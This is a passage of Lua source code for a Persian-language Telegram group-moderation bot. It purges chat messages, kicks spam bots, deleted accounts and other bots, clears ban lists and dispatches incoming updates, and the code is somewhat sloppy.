				text = text.."Audio] "..color.default
			elseif msg.content._ == "messageAnimation" then
				text = text.."Gif] "..color.default
			elseif msg.content._ == "messageSticker" then
				text = text.."Sticker] "..color.default
			elseif msg.content._ == "messageContact" then
				text = text.."Contact] "..color.default
			elseif msg.content._ == "messageDocument" then
				text = text.."File] "..color.default
			elseif msg.content._ == "messageLocation" then
				text = text.."Location] "..color.default
			end
		end
	end
	if msg.content.game then
		text = text.."Game] "..color.default
	end
	
	if msg.content._ == "messageChatAddMembers" then
		text = text.."AddUser]"..color.default
	end
	
	if msg.content._ == "messageChatJoinByLink" then
		text = text.."JoinGroup]"..color.default
	end
	
	print(text)
end
print_msg(msg)

end
end

function tdbot_update_callback(data)

function Alarme()
local function OpenChats(extra, result)
if result and result._ == 'chats' then
i = 0
for a,b in pairs(result.chat_ids) do
if string.find(tostring(b),'-') then
function vardump(value) 
print(clr.yellow.."=================== START Vardump ==================="..clr.reset) 
print(serpent.block(value, {comment=false})) 
print(clr.yellow.."=================== END Vardump ==================="..clr.reset) 
local Text = "" 
.."\n"..serpent.block(value,{comment=false}) 
.."\n" 
end 
vardump(b)

if base:get(TD_ID.."CleanMsg"..b) then
local Msg = base:get(TD_ID..'Total:messagescleaner:'..b..'') or 0
local Msgsday = tonumber(base:get(TD_ID..'Total:messagescleaner:'..b..':'..os.date('%Y/%m/%d')..'' or 00000000)) or 0
local x = os.clock()
local s = 0
for i=1,100000 do s = s + i end
print(string.format("elapsed time: %.1f\n", os.clock() - x))
local url  = https.request(Bot_Api .. '/getChatMember?chat_id='..b..'&user_id='..BotCliId)
if res ~= 200 then
end
statsurl = json:decode(url)

if statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_delete_messages == true then
function delHistory(BD,org)
if org.messages and #org.messages>0 then 
for k,v in pairs(org.messages) do
deleteMessagesFromUser(BD.chat_id,v.sender_user_id)
end
cleanmsgs(BD.chat_id,BD.msg_id,0,200,0,delHistory,{chat_id=BD.chat_id,msg_id=BD.msg_id})
else 
text = string.format("◈ پاکسازی کلی پیام انجام شد.\n▁▁▁▂▂▂▂▂▂▂▁▁▁\n๏ زمان طی شده : %.1f\n๏  تعداد کل پیام : "..Msg.." \n๏  تعداد پیام امروزی : "..Msgsday.."", os.clock() - x)
base:set(TD_ID..'CleanText:'..b,text)
send(b,0,string.format("◈ پاکسازی کلی پیام انجام شد.", os.clock() - x),'html')
base:del(TD_ID.."CleanMsg"..b)
base:del(TD_ID..'Total:messagescleaner:'..b)
base:del(TD_ID..'Total:messagescleaner:'..b..':'..os.date('%Y/%m/%d')..'')
local function groupcreator(Ramin,result)
local list = result.members
local t = '> لیست کاربران گروه:\n'
local n = 0
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(b,v.user_id)
end
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(b,v.user_id) 
end
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(b,v.user_id)
end
getChannelMembers(b, "Search", 0, 100000000000,groupcreator)
end
--send(chat_id,0,'ツ.پاکسازی کلی پیام انجام شد','md')
end
end
cleanmsgs(b,data.id, 0,200,0,delHistory,{chat_id=b,msg_id=data.id})
end
end



if base:get(TD_ID.."CleanTabchi"..b) then
local list = base:smembers(TD_ID..'AGTMute:')
if #list == 0 then
--send(chat_id, msg.id, '◈ خوشبختانه هیچ تبچی در گروه شما یافت نشد.  ', 'md')
else
for k,v in pairs(list) do
KickUsercli(b,v)
end
local list = base:smembers(TD_ID..'AGTMute:'..b)
if #list == 0  then
else
for k,v in pairs(list) do
ram = k
base:del(TD_ID.."CleanTabchi"..b)
end
base:del(TD_ID..'AGTMute:'..b)
end
end
end
if base:get(TD_ID.."cleandeleted"..b) then
local function deleteaccounts(extra, result)
if result.members then
for k,v in pairs(result.members) do 
local function cleanaccounts(extra, result)
if result.type._ == "userTypeDeleted" then
KickUser(b, result.id)
end
end
GetUser(v.user_id, cleanaccounts, nil)
end
end
end
tdbot_function ({_= "getChannelMembers",channel_id = getChatId(b).id,offset = 0,limit= 1000}, deleteaccounts, nil)
base:del(TD_ID.."cleandeleted"..b)
end

if base:get(TD_ID.."cleanblacklist"..b) then
local function removeblocklist(extra, result)
if tonumber(result.total_count) == 0 then 
base:del(TD_ID.."cleanblacklist"..b)
else
local x = 0
if result.members then
for x,y in pairs(result.members) do
x = x + 1 
Left(b, y.user_id,"Left")
end
end
end
end
getChannelMembers(b, "Banned", 0, 100000, removeblocklist)
base:del(TD_ID.."cleanblacklist"..b)
end


if base:get(TD_ID.."cleanbots"..b) then
local function botslist(extra, result)
if result.members then
for k,v in pairs(result.members) do
KickUser(b, v.user_id)
end
end
end
getChannelMembers(b, "Bots", 0,200 ,botslist)
base:get(TD_ID.."cleanbots"..b)
end

assert (tdbot_function ({_ = "openChat",chat_id= b},dl_cb,nil))
i = i + 1
if not base:get(TD_ID.."Typing:Cleaner") then
base:setex(TD_ID.."Typing:Cleaner", 10, true)
--tdbot.sendChatAction(-1001428100426, 'Typing', 100, dl_cb, nil)
end
end 
end
print("< OpenChat "..i.." AutoChat Bot Guard")
end
end
assert (tdbot_function ({_="getChats",offset_order="9223372036854775807",offset_chat_id=0,limit=999999}, OpenChats, nil))
if base:get(TD_ID.."RunAlarmPro") then
tdbot.setAlarm(5,Alarme,nil)
base:setex(TD_ID.."CheckAlarmCli", 30, true)
end
end
if not base:get(TD_ID.."CheckAlarmCli") then
base:del(TD_ID.."RunAlarmProCli")
base:setex(TD_ID.."CheckAlarmCli", 10, true)
end
if not base:get(TD_ID.."RunAlarmProCli") then 
base:set(TD_ID.."RunAlarmProCli", true)
base:setex(TD_ID.."CheckAlarmCli", 40, true)
Alarme()
end


if data._~= "updateSupergroup" then
BDStartPro(data.message,data)
end
if (data._ == "updateNewMessage") or (data._ == "updateNewChannelMessage") then
local msg = data.message
GaurdianTm(data.message, data)
openChat(msg.chat_id)
viewMessages(msg.chat_id, {[0] = msg.id})
elseif (data._ == "updateChat") then 
chat = data.chat
chats[chat.id] = chat
elseif (data._== "updateMessageEdited") then
GaurdianTm(data.message,data)
 msg = data

 
--showedit(result)
local function edit(Diamond,Guard,BOT)
BDStartPro(Guard,data)
end
assert (tdbot_function ({_ = "getMessage", chat_id = data.chat_id,message_id = data.message_id },edit,nil))
end
if data._ == "updateChatTopMessage" and data.top_message ~= nil and data.top_message.sender_user_id == BotCliId then
BotMessage(data.chat_id,data.top_message.id,data)
end
end

---Finish---

---Finish---
